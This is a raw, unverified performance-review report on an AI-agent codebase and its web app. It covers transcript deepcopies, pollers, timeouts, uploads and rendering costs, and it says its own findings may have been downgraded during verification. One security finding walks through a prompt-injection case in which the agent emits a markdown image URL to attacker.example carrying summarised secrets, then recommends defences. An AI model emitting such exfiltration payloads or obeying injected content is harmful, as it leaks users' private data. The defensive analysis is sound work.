# ai-prentice-4-all — Performance review: raw area findings

Commit `6840c13d6` (develop), 2026-10-04. This is the **unverified** output of 14 parallel area reviewers, kept for completeness. The consolidated, verified report is [`2026-10-04-performance-review.md`](2026-10-04-performance-review.md). Its findings take precedence: where they disagree, the consolidated report is right, because some raw items were downgraded or rejected during verification.

## agent-core

I did a static, read-only review of commit 6840c13d6. Agent-core has good protections for tool-definition caching, config reads, SQLite WAL and indexing, and moving database calls off the event loop. The background-review fork also reuses the parent's system prompt and tools[] so it hits the same prompt cache. The main problem is repeated work on the whole transcript every time the agent calls the model: provider conversion, Anthropic cache-marking and size estimation each deep-copy or stringify the full history on every iteration. That cost grows with conversation length and with the number of tool-loop iterations. There are also unbounded transcript loads, an O(n²) JSON snapshot path, N+1 search context queries, and a telemetry query with no supporting index. I did not contact any production host or third-party service, and I did not change any files.

**Strengths:** Config reads are cached on (mtime_ns, size), and load_config_readonly() lets hot-path callers skip the defensive deepcopy (hermes_cli/config.py:6439-6476).; Tool-definition memoization is capped and invalidated by registry/config fingerprints (model_tools.py:261-274, 306-337).; AsyncSessionDB runs blocking SQLite calls in threads with asyncio.to_thread, so they don't block the gateway event loop (hermes_state.py:6278-6292).; SessionDB uses WAL with a fallback, explicit write locking with retries, and indexes messages by (session_id, timestamp) (hermes_state.py:365-425, 821-843, 1357-1421).; The API message copy is built with a shallow msg.copy(), and ephemeral memory/plugin context is injected only into that copy, so the stored conversation and the cached prefix are never changed (agent/conversation_loop.py:796-836).; The background memory/skill review fork reuses the parent's cached system prompt, uses a byte-identical tools[] with the MCP refresh turned off, and disables persistence, so it hits the parent's provider cache prefix without polluting the session (agent/background_review.py:645-700).; The pre_api_request hook passes a shallow list copy instead of a deepcopy, explicitly to avoid walking tool results and images on every call (agent/conversation_loop.py:1126-1131).; xAI tool-schema sanitizing deep-copies tools only on the xAI path, so the shared registry is never stripped (agent/chat_completion_helpers.py:655-672).

### agent-core-1. The chat-completions transport deep-copies the whole transcript on almost every API call — High

- **Location:** `agent/transports/chat_completions.py:164-198, agent/transports/chat_completions.py:279, agent/tool_dispatch_helpers.py:361-385, hermes_state.py:4231-4236, agent/conversation_loop.py:796-836`
- **Effort / confidence:** S / high
- **Description:** convert_messages() is called from build_kwargs on every chat-completions request (line 279). It runs copy.deepcopy(messages) on the full message list whenever any message has tool_name, timestamp, codex_* or an underscore-prefixed key (lines 168-198). Every tool result has tool_name, because make_tool_result_message() sets it (tool_dispatch_helpers.py:385). Every restored message has timestamp and tool_name, because get_messages_as_conversation() sets them (hermes_state.py:4231-4236). The loop's own API copy (conversation_loop.py:796-836) strips reasoning, finish_reason and _thinking_prefill, but not tool_name or timestamp. So in practice the 'sanitize only if needed' fast path never applies after the first tool call or on any resumed session: each iteration of a tool loop deep-copies every past tool output and image just to drop a few keys. This is CPU and peak-memory cost proportional to transcript size × iterations, in the latency-critical path before every provider request.
- **Recommendation:** Replace the deepcopy with a targeted copy. Create a new dict only for messages that have keys to strip, e.g. {k: v for k, v in msg.items() if k not in _STRIP and not k.startswith('_')}, and copy tool_calls entries only when they contain call_id, response_item_id or extra_content. Leave content values shared. Better still, strip tool_name and timestamp in the conversation_loop API-copy pass that already exists (lines 798-830), so the transport scan finds nothing to do.

### agent-core-2. Every Anthropic cached request deep-copies the entire conversation to add four cache markers — High

- **Location:** `agent/prompt_caching.py:49-79`
- **Effort / confidence:** S / high
- **Description:** apply_anthropic_cache_control() starts with copy.deepcopy(api_messages) (line 62), then changes at most four messages: the system prompt and the last three non-system messages (lines 70-77). On the Anthropic/OpenRouter-Claude path this runs on every model iteration over the full API message list, including large tool outputs and base64 images. That is one more full traversal and a second full in-memory copy of the transcript per request. Prompt caching is the main cost lever in this codebase, so this runs on its most-used path.
- **Recommendation:** Shallow-copy the outer list and replace only the (up to four) breakpoint messages with shallow dict copies. When content is a list, copy only the content block that receives cache_control. Leave all other messages shared, since the API list is already a per-call copy built in conversation_loop.

### agent-core-3. Conversation replay loads and decodes an unbounded session transcript in one operation — High

- **Location:** `hermes_state.py:4187-4294`
- **Effort / confidence:** L / high
- **Description:** get_messages_as_conversation() runs a single SELECT over every active row in the session lineage, calls fetchall(), then decodes, sanitizes and JSON-parses each row's structured fields into a Python list (the row loop starts at line 4225). Long-lived conversations and compression archives can make this a large synchronous allocation with high latency, and a freshly built gateway agent pays it before its first model call. This restore path has no row or token limit and no pagination or streaming.
- **Recommendation:** Load only the live context the model needs, using a bounded or token-aware query (e.g. rows after the latest compression anchor). Keep full-archive export and search on a separate paginated API. If full replay is unavoidable, iterate the cursor instead of calling fetchall(), and decode structured fields lazily.

### agent-core-4. Request-size accounting stringifies the full history up to three times on every API iteration — Medium

- **Location:** `agent/conversation_loop.py:962-967, agent/model_metadata.py:2216-2312`
- **Effort / confidence:** M / high
- **Description:** Before each provider call, the loop computes total_chars = sum(len(str(msg)) for msg in api_messages) for logging (line 963), then estimate_messages_tokens_rough() (which builds a shadow dict per message and calls str(shadow), model_metadata.py:2259-2289), then estimate_request_tokens_rough(), which estimates the messages again and adds len(str(tools)) (line 2312). Python's str() on nested dicts is slow and allocates the full repr, so this is two to three full-transcript repr passes per iteration, plus re-stringifying the unchanged tool schemas. This stacks with the deepcopies in the findings above.
- **Recommendation:** Compute the per-message estimate once and reuse it for total_chars, approx_tokens and approx_request_tokens. Cache the tool-schema estimate by tools identity or generation. Ideally keep a running char/token total per message that is updated on append or compression, so the cost per iteration is O(new messages).

### agent-core-5. JSON snapshots, when enabled, rewrite and reparse the complete transcript at every persistence point — Medium

- **Location:** `run_agent.py:2542-2620, utils.py:111-160`
- **Effort / confidence:** M / high
- **Description:** When sessions.write_json_snapshots is enabled, _save_session_log() rebuilds the full cleaned message list, reads and json.loads() the existing snapshot to compare message_count, then calls atomic_json_write(). That function writes a temp file, fsyncs it and os.replace()s it over the full snapshot (utils.py:111-160). _persist_session() calls this on many early-exit, error and per-iteration paths. With n messages and many persistence points per turn, that is O(n²) serialization, fsync'd disk I/O and repeated secret redaction.
- **Recommendation:** Treat SQLite (already incremental) or an append-only JSONL file as the store of record, and write a full JSON snapshot only at turn or session boundaries. If the full snapshot must stay, keep the last persisted count in memory instead of re-reading the file, and skip the write when nothing changed.

### agent-core-6. Search result context runs an extra SQLite query per match (N+1) — Medium

- **Location:** `hermes_state.py:4840-4895`
- **Effort / confidence:** M / high
- **Description:** After the main FTS/LIKE query returns up to limit rows, search_messages() loops over each match and runs a separate context query for the previous, current and next messages. With limit=20 that is up to 20 extra queries per search, each taken under the SessionDB lock and each decoding rows again. Concurrent dashboard and session_search tool traffic queues behind that lock, and the cost grows linearly with page size.
- **Recommendation:** Fetch all neighbouring rows in one query: a CTE over the matched message IDs, joined to messages on session_id with LAG/LEAD or an id-range join. Group the results in Python. Alternatively, make context opt-in and batch-load it.

### agent-core-7. Turn-latency telemetry filters messages by timestamp with no index that starts with timestamp — Low

- **Location:** `hermes_state.py:1280-1345, hermes_state.py:821-843`
- **Effort / confidence:** S / medium
- **Description:** recent_turn_latencies_s() filters messages with WHERE timestamp >= ?, computes LAG over the result, joins sessions, sorts by timestamp and applies a LIMIT. The schema indexes messages by (session_id, timestamp) but has no index that starts with timestamp, so SQLite cannot use the timestamp filter to narrow a large multi-session messages table. It will scan and sort a large share of messages every time this capacity/telemetry query runs.
- **Recommendation:** Add CREATE INDEX IF NOT EXISTS idx_messages_timestamp ON messages(timestamp), optionally covering session_id and role, and confirm the plan with EXPLAIN QUERY PLAN. If the query is polled often, keep a small bounded rolling aggregate of turn latencies instead.

## agent-home-api

The agent-home BFF is a thin, mostly stateless proxy: each route reads the signed cookie, builds a HermesApiClient and forwards to the Python API on 127.0.0.1:9119. Pages already run independent upstream reads in parallel, and project views have moved from polling to SSE. Most of the steady-state load comes from timers on the client side: the status strip (5 upstream calls every 30 s, one of which builds a full 30-day InsightsEngine report), the unread badge (a 200-row session list every 45 s on every page) and the chat idle watch (every 10 s). None of these has any server-side caching, and they land on synchronous SQLite and psutil work inside async Python handlers. Several I/O paths also undercut the box's resources: globally disabled fetch timeouts with no AbortSignal, multipart uploads buffered whole in memory with no default cap, chat media re-signed twice and re-downloaded on every mount because of `no-store`, and an in-repo Caddyfile that gzips every response, including the newer project SSE streams. No prompt-cache problems were found in this area: the BFF prepends UI context and attachment links to the new user message only (chat/stream/route.ts) and never rewrites past turns or the system prompt.

**Strengths:** fetchSessionList (lib/chat/session-list-fetch.ts) merges duplicate focus/visibility/timer reads into one shared in-flight request with a 2 s reuse window.; StatusStrip keeps one request in flight at a time and only polls while the tab is visible; the age clock also skips ticks while hidden.; Project run, card and event views use SSE pushes (_openRowStream) instead of timer polling, and SSE responses set `no-cache, no-transform` and `x-accel-buffering: no`.; RSC pages (chat, inbox, files, project detail) run independent upstream reads with Promise.all instead of one after another.; Folder Bridge import streams through a SHA-256 TransformStream straight to Storage, with a chunked on-disk spool, a statfs pre-check and an idempotent finalize: no buffering in memory.; The pg Pool is a process-wide singleton; the upload replay map is bounded by TTL and REPLAY_MAX=500; /api/sessions attaches tags in bulk with one query per page instead of N+1.; Per-request upstream api-timing logging makes slow endpoints visible in journald.

### agent-home-api-1. Status strip poll triggers a full 30-day insights report and a blocking 100 ms CPU sample every 30 s per tab, with no BFF caching — High

- **Location:** `agent-home/src/app/api/status/summary/route.ts:18-24, agent-home/src/components/ui/StatusStrip.tsx:8, agent-home/src/components/ui/StatusStrip.tsx:97-109, hermes_cli/web_server.py:15636-15682, hermes_cli/web_server.py:2516, agent/insights.py:113-119, agent/insights.py:260, agent/insights.py:317-335`
- **Effort / confidence:** M / high
- **Description:** Every MobileShell page mounts StatusStrip. It calls GET /api/status/summary on mount, every 30 s while visible, and on every focus or visibilitychange. Each call fans out to 5 uncached Python calls. (1) usageAnalytics(30) hits /api/analytics/usage, an `async def` that runs 3 SQLite aggregates and then `InsightsEngine(db).generate(days=30)`. That report pulls the sessions, tool usage, skill usage and message stats for the whole 30-day window and `json.loads` every message's tool_calls and arguments (insights.py:260/317/335). The strip only reads `usage.totals`. (2) systemStats hits /api/system/stats, which calls `psutil.cpu_percent(interval=0.1)`, a 100 ms sleep inside an async handler. (3) projects({status:'active', limit:100}) lists up to 100 projects only to add up `progress.cards.running`. All of this is synchronous work on the Python API's event loop, so with several tabs or devices open it adds latency to every other dashboard and BFF call, including chat send. Cost grows with tabs × history size, even when nobody is looking at the numbers.
- **Recommendation:** Add a short-TTL cache (about 15-30 s, keyed by profile) for StatusSummary in the BFF route, shared across tabs, or expose one cheap Python `/api/status/summary` that only runs the totals query (no InsightsEngine), reads the running-card count with a COUNT query, and uses `psutil.cpu_percent(interval=None)`. Run the SQLite and psutil work through `run_in_threadpool`. Optionally raise the client poll to 60 s.

### agent-home-api-2. In-repo Caddyfile gzips everything, and the documented SSE matcher only covers chat paths, so project SSE streams are likely buffered — Medium

- **Location:** `agent-home/deploy/Caddyfile.agent-home:26-37, docs/deployment/PRODUCTION.md:83-91, agent-home/src/app/api/projects/[slug]/events/stream/route.ts:31-35, agent-home/src/app/api/projects/[slug]/runs/[runNo]/stream/route.ts:34-38, agent-home/src/app/api/projects/[slug]/runs/[runNo]/activity/route.ts:40-44, agent-home/src/app/api/projects/[slug]/cards/[taskId]/stream/route.ts:30-34`
- **Effort / confidence:** S / medium
- **Description:** PRODUCTION.md records that `encode zstd gzip` holds back `text/event-stream` frames until the stream ends, so the hand-maintained box Caddyfile has an `@sse` handle with no encode and `flush_interval -1` for `/api/chat/stream` and `/api/chat/attach` only. The committed Caddyfile.agent-home, the install source in DEPLOY.md, has no such block: every path goes through `encode zstd gzip`. The four project SSE routes added for the push edition (runs stream, run activity, card stream, project events stream) are not in the documented matcher. If the box matches the docs, these streams arrive in bursts or, for the never-ending events stream, not at all, which silently turns the live views back into reload-to-see. Confidence is medium: the box config is not in git, and the routes do send `no-transform`, which some Caddy versions may honour.
- **Recommendation:** Commit the real `@sse` block in Caddyfile.agent-home: a path matcher for `/api/chat/stream`, `/api/chat/attach` and `/api/projects/*/…/stream` plus `…/activity`, or a `header Content-Type text/event-stream` response matcher, served with no `encode` and `flush_interval -1`. Alternatively scope `encode` with a `match` that excludes `text/event-stream`. Then sync the box config to it.

### agent-home-api-3. All outbound fetch timeouts and the inbound requestTimeout are disabled globally; upstream calls carry no AbortSignal — Medium

- **Location:** `agent-home/src/instrumentation.ts:34-56, agent-home/src/lib/api/client.ts:205-241, agent-home/src/lib/api/client.ts:691-698, agent-home/src/lib/api/client.ts:2097-2100`
- **Effort / confidence:** M / high
- **Description:** To unblock large Folder Bridge imports, `register()` installs a global undici Agent with `headersTimeout: 0, bodyTimeout: 0` and forces `http.Server.requestTimeout = 0`. This applies to every fetch in the process, not just Storage uploads: all HermesApiClient.request calls, SSE openers, proxyBytes and Supabase SDK calls. `request()` sets no `signal` and does not forward the incoming `request.signal`. If the Python API stalls (for example while its event loop is blocked by the synchronous work in the status-strip finding) or a route hangs, every BFF request and its socket stays open indefinitely. The 10 s, 30 s and 45 s pollers keep adding more per tab, so pending promises, sockets and memory build up in the single Node process and no 502 ever reaches the UI.
- **Recommendation:** Keep the default dispatcher, or set sane timeouts (for example headersTimeout 30 s, bodyTimeout 120 s). Pass a dedicated `new Agent({headersTimeout:0, bodyTimeout:0})` as `dispatcher` only for the Storage upload in uploadChatMediaStream. In HermesApiClient.request, use `AbortSignal.any([AbortSignal.timeout(N), incomingSignal])`. Scope `requestTimeout=0` to the import route via chunking, which the spool already provides, instead of setting it process-wide.

### agent-home-api-4. Each chat image costs 2 BFF hops and 2 Storage signs, then is re-downloaded on every mount because of `private, no-store` — Medium

- **Location:** `agent-home/src/components/chat/ChatMedia.tsx:31, agent-home/src/app/api/chat/media/route.ts:59-63, agent-home/src/app/api/chat/media/content/route.ts:50-57, agent-home/src/lib/http/proxy-bytes.ts:47-61, agent-home/src/lib/supabase/storage.ts:182-189`
- **Effort / confidence:** S / high
- **Description:** ChatMedia fetches `/api/chat/media?path=` with `cache: no-store`, which creates a supabase-js client and signs a URL only to return `mediaContentRef(path)`, a URL the browser could have built itself. The `<img>` then hits `/api/chat/media/content`, which creates a new client, signs again and proxies the full object through Node. proxyBytes always sets `cache-control: private, no-store`, so the conditional headers it forwards (if-none-match/if-modified-since) never get a chance to work, and the browser re-downloads every image whenever the transcript re-renders, ChatPane remounts or the page is revisited. Object keys contain a random UUID (scopedMediaPath), so the bytes are immutable per path. On a mobile PWA with image-heavy chats this wastes bandwidth and Node CPU on every visit.
- **Recommendation:** Render `<img src={mediaContentRef(path)}>` directly and drop the JSON hop. In proxyBytes, for these UUID-keyed media paths, send `cache-control: private, max-age=86400, immutable` (still private, so no shared cache) and pass ETag through. Create the service-role storage client once per module, as push/store.ts and storage.ts could share, instead of on every call.

### agent-home-api-5. Multipart upload routes buffer the whole file (twice) in Node memory, with no size cap by default — Medium

- **Location:** `agent-home/src/app/api/chat/upload/route.ts:43, agent-home/src/app/api/chat/upload/route.ts:64-76, agent-home/src/app/api/projects/[slug]/files/upload/route.ts:107, agent-home/src/app/api/projects/[slug]/files/upload/route.ts:132-138, agent-home/src/lib/chat/upload-limit.ts:11-14`
- **Effort / confidence:** M / high
- **Description:** `/api/chat/upload` and `/api/projects/:slug/files/upload` call `request.formData()`, which materialises the whole multipart body, then `file.arrayBuffer()` (another full copy), then pass the bytes to supabase-js and `crypto.subtle.digest`. `uploadMaxBytes()` defaults to `POSITIVE_INFINITY`; the UI only warns above 100 MB (UPLOAD_WARN_BYTES). A single large attachment can push the Next process up by 2x the file size or more on a box shared with Postgres, Supabase containers and the Python agent, risking GC stalls for every other user's request or an OOM kill. The streaming import route (files/import) already solves this but is not used for chat or project uploads.
- **Recommendation:** Send chat and project uploads through the same streaming or chunked path as `/api/files/import` (raw body with headers, SHA-256 TransformStream, `uploadChatMediaStream`), or at least set a finite default `AGENT_HOME_UPLOAD_MAX_BYTES` (for example 100-200 MB) and check `content-length` before calling `formData()`.

### agent-home-api-6. Unread badge pulls a 200-row rich session list every 45 s on every page just to compute a count — Medium

- **Location:** `agent-home/src/components/coral/useChatUnread.ts:15, agent-home/src/components/coral/useChatUnread.ts:27-34, agent-home/src/components/MobileShell.tsx:117, agent-home/src/app/api/chat/sessions/route.ts:45-54, hermes_cli/web_server.py:5459-5540`
- **Effort / confidence:** M / high
- **Description:** CoralHost, mounted on every MobileShell page, calls `/api/chat/sessions?limit=200` every 45 s and on wake. It is not gated on visibility for the interval tick. Upstream this runs `list_sessions_rich` (a recursive CTE across compression chains), `session_count` and a bulk tag lookup for 200 rows: synchronous SQLite in an `async def`. The full 200-row payload (titles, previews, tags) then travels through the BFF only for `countUnreadSessions` to compare `last_active` timestamps. Each tab and device adds the same load.
- **Recommendation:** Skip the interval tick when `document.visibilityState !== 'visible'`. Add a lean upstream query (`fields=id,last_active`, or `since=<max last_active>` returning only changed ids) and/or ETag + If-None-Match so an unchanged list returns 304. A short shared cache in the BFF route would also merge requests across tabs.

### agent-home-api-7. Chat idle watch polls `/api/chat/active` every 10 s per open conversation — Low

- **Location:** `agent-home/src/components/chat/ChatPane.tsx:87, agent-home/src/components/chat/ChatPane.tsx:211-239, agent-home/src/app/api/chat/active/route.ts:24-27`
- **Effort / confidence:** M / high
- **Description:** While a chat is open and idle, every visible tab sends a full BFF-to-Python round trip (cookie verify, upstream fetch, api-timing log line) every 10 s, plus one on each focus or visibility change, to detect turns started from other surfaces. That is 6 requests per minute per tab, which is significant next to the strip and badge pollers on a single box. The rest of the app already uses push for this kind of signal.
- **Recommendation:** Replace the poll with a long-lived SSE 'session activity' stream (as for project events), or back off exponentially (10 s → 60 s) while nothing changes, and fold the active-run hint into the session-list poll the badge already makes.

### agent-home-api-8. Chat page deep link re-runs an identical session-list query — Low

- **Location:** `agent-home/src/app/chat/page.tsx:52-76`
- **Effort / confidence:** S / high
- **Description:** When `?session=` names a session that is not in the first page, the page calls `client.sessions({order:'recent', limit: CHAT_SESSION_LIST_LIMIT})` again with exactly the same parameters as the first call at lines 57-62. It can only return the same 200 rows, so the extra round trip (a recursive CTE plus a count upstream) is wasted, delays first paint of the chat page, and still cannot find the session.
- **Recommendation:** Remove the second call, or fetch the one session by id (for example the existing per-session endpoint, or `sessionMessages`, which already resolves the id) and prepend its summary.

### agent-home-api-9. Transcripts are never paginated: the full history is serialised into the RSC payload and re-fetched after every attach — Low

- **Location:** `agent-home/src/lib/api/client.ts:509-513, hermes_cli/web_server.py:10307-10316, agent-home/src/app/chat/page.tsx:83-86, agent-home/src/components/chat/ChatPane.tsx:361-372`
- **Effort / confidence:** M / medium
- **Description:** `sessionMessages` returns every message (`db.get_messages(sid)`), including tool rows. The chat page embeds the whole array in the server-rendered HTML and the RSC flight data, and `reloadTranscript` downloads it all again after each attached external turn. Long-lived conversations, which this product encourages to keep prompt caching intact, grow to large payloads that are slow on mobile and costly to JSON-encode on both servers.
- **Recommendation:** Add `?limit=&before=` tail pagination upstream and in the BFF. SSR only the last N visible messages and lazy-load older ones on scroll. After an attach, fetch only messages after the last known id.

### agent-home-api-10. Push config route downloads the VAPID and subscription documents from Storage on every fan-out — Low

- **Location:** `agent-home/src/app/api/notifications/config/route.ts:22-23, agent-home/src/lib/push/store.ts:36-56`
- **Effort / confidence:** S / high
- **Description:** The Python sender pulls `/api/notifications/config` before each Web Push fan-out. Each call creates a new supabase-js client and does 2 sequential Storage downloads (vapid.json, then subscriptions.json), adding Storage round trips to every notification. The data changes only on enrolment, which is rare by the module's own comment.
- **Recommendation:** Cache both documents in module scope (or with a 60 s TTL) and invalidate in `addSubscription`, `removeSubscription` and `ensureVapid` writes. Run the two reads in parallel with Promise.all, and reuse one storage client.

### agent-home-api-11. Spool sweep walks the whole import spool tree on every chunk request — Low

- **Location:** `agent-home/src/app/api/files/import/route.ts:59-84, agent-home/src/app/api/files/import/route.ts:202`
- **Effort / confidence:** S / high
- **Description:** `handleChunkedImport` awaits `sweepSpool()` (readdir of every principal dir plus a stat of every file) before handling each chunk. A 1 GiB import in small chunks means hundreds of full directory scans, which adds per-chunk latency to an upload path that is already timeout-sensitive. The work also grows with the number of parked spools.
- **Recommendation:** Throttle the sweep (run it at most once every N minutes, tracked with a module-level timestamp) or move it to a background `setInterval` / startup task. Do not await it on the request path.

### agent-home-api-12. Upstream timing logged with synchronous console.log on every proxied call, multiplied by the pollers — Low

- **Location:** `agent-home/src/lib/api/client.ts:226-239`
- **Effort / confidence:** S / medium
- **Description:** Every `request()` writes an `api-timing` line, as console.log below 500 ms and console.warn above. With the status strip (5 calls every 30 s), the active watch (every 10 s) and the unread badge (every 45 s), one idle tab writes about 18+ journald lines a minute, mostly noise. Writing stdout to a journald pipe can be synchronous in Node, so the logging also adds work to the event loop and journal disk churn.
- **Recommendation:** Log only calls at or above a threshold (keep the ≥500 ms warn) or sample fast calls, and/or skip known poll endpoints.

### agent-home-api-13. Next's built-in gzip runs in-process even though Caddy already encodes — Low

- **Location:** `agent-home/next.config.mjs:24-41, agent-home/deploy/Caddyfile.agent-home:27`
- **Effort / confidence:** S / medium
- **Description:** next.config.mjs does not set `compress: false`, so `next start` gzips responses on the single Node event loop. Caddy passes already-encoded responses through untouched, so clients get Next's gzip instead of Caddy's zstd, and the CPU cost lands on the busiest process instead of Caddy.
- **Recommendation:** Set `compress: false` in next.config.mjs and let Caddy (with the SSE carve-out above) handle compression.

### agent-home-api-14. RLS-scoped read takes 5 round trips and the pool has no statement timeout — Low

- **Location:** `agent-home/src/lib/supabase/context.ts:28-33, agent-home/src/lib/supabase/context.ts:83-104, agent-home/src/app/page.tsx:30-33`
- **Effort / confidence:** S / high
- **Description:** `withPrincipalContext` sends BEGIN, SET LOCAL search_path, SELECT set_config, the query and COMMIT as 5 separate round trips per read. The Pool uses defaults (max 10, no `statement_timeout`, no `connectionTimeoutMillis`), so a slow query or an exhausted pool waits forever. Today the only caller is the Home page seam proof (5 goals), so the impact is small, but it is the pattern Wave-B panels are told to adopt.
- **Recommendation:** Fold search_path and both GUCs into one `SELECT set_config('search_path',…,true), set_config(…), set_config(…)` after BEGIN. Configure the Pool with `max`, `connectionTimeoutMillis`, `idleTimeoutMillis` and `statement_timeout` (or `SET LOCAL statement_timeout`).

## agent-home-ui

The agent-home client is mostly well-behaved. Polls are coalesced and usually skip hidden tabs, streams reconnect with capped backoff, and MessageBubble is memoized so finished bubbles skip re-render during streaming. The biggest costs are in the chat render path. RichText declares react-markdown `components` inline, so every re-render swaps out the element types: the whole Markdown DOM is remounted and ChatMedia fetches a new signed URL each time. While a reply streams, the entire accumulated Markdown is re-parsed on every SSE delta with no coalescing. The shell chrome (StatusStrip, CoralHost, LeadChatHost) lives in a per-page server component rather than a layout, so every client navigation remounts it. Each remount re-fires a 5-way backend fan-out plus a 200-row session-list read. On the security side, model output can embed arbitrary remote <img> URLs (a zero-click data-exfiltration channel) and there is no CSP. Smaller issues: the service-worker cache grows without bound, the LiveStatusBar clock ticks unconditionally, the transcript is loaded without pagination, and the repo's Caddy template applies gzip to SSE routes.

**Strengths:** MessageBubble is memoized, and setLastAssistantContent (lib/chat/messages.ts:20-32) keeps the identity of unchanged messages, so finished bubbles are skipped during streaming.; fetchSessionList (lib/chat/session-list-fetch.ts) merges overlapping session-list reads and reuses results for 2s, which collapses focus+visibilitychange bursts.; StatusStrip, ChatPane's idle watch and ProjectsList only poll while the tab is visible and re-read on wake. StatusStrip's single-flight guard stops refresh/poll overlap.; Per-second clocks in ChatPane, LeadChatHost and CardDetailView only run while a turn or card is in flight.; Project live updates use server-pushed SSE (useProjectEvents/useRowStream) with throttled router.refresh and capped reconnect backoff, rather than timer polling. The WebSocket bridges back off exponentially up to 30s.; The chat and projects pages fetch independent data with Promise.all, and MobileShell's todo-facets badge is cached per principal with unstable_cache (120s).; Assistant Markdown goes through rehype-raw followed by rehype-sanitize (fail-closed). User turns are never interpreted as markup. SessionSearchBar escapes &, < and > before injecting <mark>. The ThemeScript inline script is built only from constants.; The service worker never intercepts /api/* or /auth/* or cross-origin requests, so per-principal data is never cached. Activation and survey URLs get no-referrer and no-store headers.; The heavy server-only dependency `pg` is kept out of client bundles via serverExternalPackages.

### agent-home-ui-1. RichText's inline react-markdown `components` remount the whole reply DOM on every render, and ChatMedia re-fetches signed URLs each time — Medium

- **Location:** `agent-home/src/components/chat/RichText.tsx:28-53, agent-home/src/components/chat/ChatMedia.tsx:27-45, agent-home/src/components/chat/MessageBubble.tsx:130,166-175, agent-home/src/components/chat/ChatPane.tsx:1031-1038`
- **Effort / confidence:** S / high
- **Description:** `components={{ a: ..., img: ..., h1: ..., table: ..., code: ... }}` is a new object of new arrow-function components on every RichText render. react-markdown 10 (via hast-util-to-jsx-runtime) uses these functions as React element types, so React sees a different type each render. It unmounts and remounts every link, heading, list, table and code block, plus any ChatMedia inside them, instead of updating them. ChatMedia's mount effect calls `fetch(mediaRef(path), {cache:'no-store'})` to sign the URL, so each remount makes a new BFF round trip and a new Supabase signed URL, and the <img> reloads (flicker). This happens on every streaming delta for the live bubble. It also hits every assistant bubble whenever ChatPane passes a new `highlightTerm` (ChatPane.tsx:1037): the memo compares that prop, even though only UserContent uses it. Typing into in-session search therefore re-signs every inline image in the thread. The rehype plugin array is also re-created on every render.
- **Recommendation:** Hoist the `components` map and the `remarkPlugins`/`rehypePlugins` arrays to module-level constants so the element types are stable. Wrap RichText in `memo`. Pass `highlightTerm` only to user bubbles, or exclude it from the memo comparison for assistant messages. Optionally cache signed media URLs per path in a module-level Map with TTL slightly below the signature expiry, so remounts don't re-sign.

### agent-home-ui-2. Streaming reply re-parses the full accumulated Markdown (remark-gfm + rehype-raw/parse5 + sanitize) on every SSE delta, with no frame coalescing — Medium

- **Location:** `agent-home/src/components/chat/ChatPane.tsx:396-420, agent-home/src/components/chat/ChatPane.tsx:519-525, agent-home/src/components/chat/ChatPane.tsx:293-308, agent-home/src/lib/chat/stream.ts:253-266, agent-home/src/components/chat/RichText.tsx:25-27`
- **Effort / confidence:** M / high
- **Description:** Each `onDelta` calls setLive, which runs `setMessages(setLastAssistantContent(...))`, and also `touch()`, which runs `setLiveActivity`. That is two state updates per SSE frame, and readSseFrames dispatches frames as soon as they are decoded. Every update re-renders ChatPane (SessionTabs, TagFilterBar, Composer and LiveActivity are not memoized). It also re-runs RichText on the whole reply so far, and with rehype-raw that means a full parse5 HTML re-parse plus sanitize. Total work therefore grows quadratically with reply length. A 4-8k-token answer with tables can peg a phone's main thread and make the composer and scroll lag. The pin-to-bottom effect also depends on `messages` and `liveActivity`, so every delta schedules two rAFs that set scrollTop and force layout. LeadChatHost has the same pattern on every page.
- **Recommendation:** Buffer deltas in liveRef (already done) and flush to React at most once per animation frame or every ~50-100ms (e.g. a rAF-scheduled `flush()`). Update `lastEventAt` from a ref instead of state. Consider rendering the in-flight bubble as plain text or with remark only (no rehype-raw) until `onCompleted`, then render the full sanitized Markdown once. Memoize SessionTabs and Composer, or move the 1s `now` tick into StatusIndicator, so the pane doesn't re-render as a whole.

### agent-home-ui-3. Model output can load arbitrary remote images (zero-click exfiltration of chat data), and there is no Content-Security-Policy — Medium

- **Location:** `agent-home/src/components/chat/RichText.tsx:41-53, agent-home/src/components/chat/MessageBubble.tsx:65-72, agent-home/next.config.mjs:45-66, agent-home/deploy/Caddyfile.agent-home:26-37`
- **Effort / confidence:** M / high
- **Description:** rehype-sanitize's default schema allows `img src` with http/https. The custom `img` renderer turns any non-media-ref URL into a plain `<img src={url}>`. The agent reads untrusted content (email, web, calendar), so a prompt injection can make it emit `![](https://attacker.example/p?d=<summarised secrets>)`. The browser then fetches that URL as soon as the reply renders, with no user click: a well-known LLM exfiltration channel that also leaks the user's IP and user agent. No CSP exists anywhere (next.config headers set only Referrer-Policy and robots tags for /activate and /survey; there is no middleware and none in the Caddy template). So no `img-src` restriction backstops it, and there is no defence-in-depth for any future XSS in this token-bearing BFF origin.
- **Recommendation:** In RichText, only render <img> for private media refs, and render other URLs as a click-to-load link or placeholder (or proxy them through an allow-listed BFF). Add a CSP via next.config `headers()` for `/:path*`: at minimum `img-src 'self' data: blob: <supabase-storage-origin>; connect-src 'self' wss://<host>; frame-ancestors 'none'; object-src 'none'; base-uri 'self'`. Use a nonce or hash for the ThemeScript inline script so `script-src` can drop 'unsafe-inline'.

### agent-home-ui-4. Shell chrome is rendered per page, not in a layout, so every client navigation remounts StatusStrip, CoralHost and LeadChatHost and re-fires their backend fan-out — Medium

- **Location:** `agent-home/src/components/MobileShell.tsx:51-119, agent-home/src/components/ui/StatusStrip.tsx:97-101, agent-home/src/app/api/status/summary/route.ts:18-24, agent-home/src/components/coral/useChatUnread.ts:27-34, agent-home/src/lib/chat/session-list-fetch.ts:26`
- **Effort / confidence:** M / high
- **Description:** The only layout is src/app/layout.tsx. MobileShell is an async server component that 31 of 33 page.tsx files render themselves. On a soft navigation the page segment is replaced, so the client components MobileShell mounts are unmounted and remounted. Each navigation then: (1) StatusStrip's mount effect calls /api/status/summary. That route fans out to 5 Python calls: systemStats, usageAnalytics(30), capacity, cronJobs, and projects(limit 100), which is then reduced client-side. (2) useChatUnreadCount fetches `/api/chat/sessions?limit=200`, and the coalescer's 2s freshness window only helps rapid double-fires. (3) MobileShell re-runs getPrincipal and readSession server-side. Someone tapping through Coral tiles adds about 6 backend reads per tap on top of the page's own data, and the StatusStrip numbers flash to '—' each time. On a single box shared by the agent workers, this is avoidable load on the Python API and DB.
